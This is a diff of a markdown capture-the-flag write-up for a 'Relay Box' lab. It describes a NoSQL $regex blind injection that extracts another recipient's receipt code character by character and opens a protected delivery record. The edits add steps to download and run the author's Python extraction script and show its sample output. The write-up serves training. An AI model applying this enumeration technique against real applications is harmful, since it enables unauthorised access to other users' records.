@@ -1,4 +1,4 @@
-# Relay Box  — relaybox-007 — Regex.
+# Relay Box — relaybox-007 — Regex
 
 ## Overview
 
@@ -11,7 +11,7 @@
 
 ## 1. Initial Reconnaissance
 
-After opening the web application, I registered a test account and inspected the HTTP traffic using browser Developer Tools.
+After opening the web application, I registered a test account and inspected HTTP traffic using browser Developer Tools.
 
 ### Authentication Endpoint
 
@@ -19,7 +19,7 @@ After opening the web application, I registered a test account and inspected the
 GET /api/auth/me
 ```
 
-The response contained the authenticated user's details, including:
+The response contained authenticated user details, including:
 
 ```json
 {
@@ -37,12 +37,12 @@ GET /api/shipments
 
 The response revealed multiple shipment references:
 
-| Shipment Reference | Recipient              | Status           |
-| ------------------ | ---------------------- | ---------------- |
-| RB-2041-AC         | Your account           | In transit       |
-| RB-1899-ZL         | Your account           | Out for delivery |
-| RB-DEMO-01         | RelayBox Demo Depot    | Delivered        |
-| RB-7731-KM         | Marigold Lane Pharmacy | Delivered        |
+| Shipment Reference | Recipient | Status |
+|---|---|---|
+| RB-2041-AC | Your account | In transit |
+| RB-1899-ZL | Your account | Out for delivery |
+| RB-DEMO-01 | RelayBox Demo Depot | Delivered |
+| RB-7731-KM | Marigold Lane Pharmacy | Delivered |
 
 The demonstration shipment exposed a public receipt code:
 
@@ -52,7 +52,7 @@ RBX-a1b2c3
 
 ## 2. Receipt Functionality
 
-Two endpoints were identified:
+Two endpoints were identified.
 
 ### Check Receipt
 
@@ -84,7 +84,7 @@ Response:
 POST /api/receipts/open
 ```
 
-The endpoint returned the proof of delivery when a valid receipt code was provided.
+The endpoint returned proof of delivery when a valid receipt code was provided.
 
 ## 3. Vulnerability Discovery
 
@@ -138,13 +138,11 @@ The receipt code was extracted using blind regex-based enumeration.
 
 ### Character-by-Character Extraction
 
-The extraction process:
-
 1. Start with the known prefix `RBX-`.
 2. Test possible characters using `$regex`.
 3. Identify the character that produces `valid: true`.
 4. Append the discovered character to the prefix.
-5. Repeat until the entire receipt code is recovered.
+5. Repeat until the complete receipt code is recovered.
 
 Example:
 
@@ -157,19 +155,90 @@ Example:
 }
 ```
 
-Continue testing until the complete receipt code is identified.
+The process was automated using Python.
 
-## 5. Automated Extraction
+## 5. Automated Extraction Using Python
 
-A Python script using the `requests` library automated the extraction.
+The extraction script is available in my GitHub repository:
 
-The script:
+**Script:** [regex.py](https://github.com/F45H1L/Bugforge/blob/main/Relaybox/Regex/regex.py)
 
-- Maintained the authenticated session cookie.
-- Sent requests to `/api/receipts/check`.
-- Tested candidate characters against regex prefixes.
-- Extended the prefix when a match was found.
-- Checked for the complete receipt code.
+### Prerequisites
+
+- Python 3
+- pip
+- An authenticated BugForge Relay Box session
+
+### Step 1 — Download the Script
+
+Using `wget`:
+
+```bash
+wget https://raw.githubusercontent.com/F45H1L/Bugforge/main/Relaybox/Regex/regex.py
+```
+
+Alternatively, clone the repository:
+
+```bash
+git clone https://github.com/F45H1L/Bugforge.git
+cd Bugforge/Relaybox/Regex
+```
+
+### Step 2 — Configure the Script
+
+Open the downloaded script:
+
+```bash
+nano regex.py
+```
+
+Update the configuration values to match your own challenge instance.
+
+| Variable | Description |
+|---|---|
+| `BASE_URL` | Your Relay Box challenge URL |
+| `SHIPMENT_REF` | Shipment reference you want to investigate |
+| `SESSION_COOKIE` | Your authenticated `relaybox_session` cookie |
+| `CSRF_TOKEN` | CSRF token from `/api/auth/me` |
+| `ALPHABET` | Characters to enumerate |
+| `MAX_LENGTH` | Maximum receipt-code length |
+
+**Important:** Register your own test account and use your own session cookie and CSRF token. Never use another user's session credentials.
+
+### Step 3 — Execute the Script
+
+```bash
+python3 regex.py
+```
+
+### Example Output
+
+```text
+[*] Target shipment: RB-7731-KM
+[*] Initial prefix: RBX-
+
+[+] Found character: 8
+[+] Current code: RBX-8
+
+[+] Found character: c
+[+] Current code: RBX-8c
+
+[+] Found character: 0
+[+] Current code: RBX-8c0
+
+[+] Found character: a
+[+] Current code: RBX-8c0a
+
+[+] Found character: e
+[+] Current code: RBX-8c0ae
+
+[+] Found character: 6
+[+] Current code: RBX-8c0ae6
+
+[+] Receipt code recovered: RBX-8c0ae6
+
+[*] Finished.
+```
 
 ### Extracted Receipt Code
 
@@ -179,7 +248,7 @@ RBX-8c0ae6
 
 ## 6. Accessing the Protected Receipt
 
-The recovered code was used against:
+The recovered receipt code was used against:
 
 ```http
 POST /api/receipts/open
@@ -198,14 +267,14 @@ The application returned the proof of delivery.
 
 ### Receipt Details
 
-| Field     | Value                     |
-| --------- | ------------------------- |
-| Shipment  | RB-7731-KM                |
-| Recipient | Marigold Lane Pharmacy    |
-| Address   | 14 Marigold Lane, Keswick |
-| Carrier   | RelayBox Secure           |
-| Signed by | P. Raman                  |
-| Parcels   | 1                         |
+| Field | Value |
+|---|---|
+| Shipment | RB-7731-KM |
+| Recipient | Marigold Lane Pharmacy |
+| Address | 14 Marigold Lane, Keswick |
+| Carrier | RelayBox Secure |
+| Signed by | P. Raman |
+| Parcels | 1 |
 
 The delivery note contained the challenge flag.
 
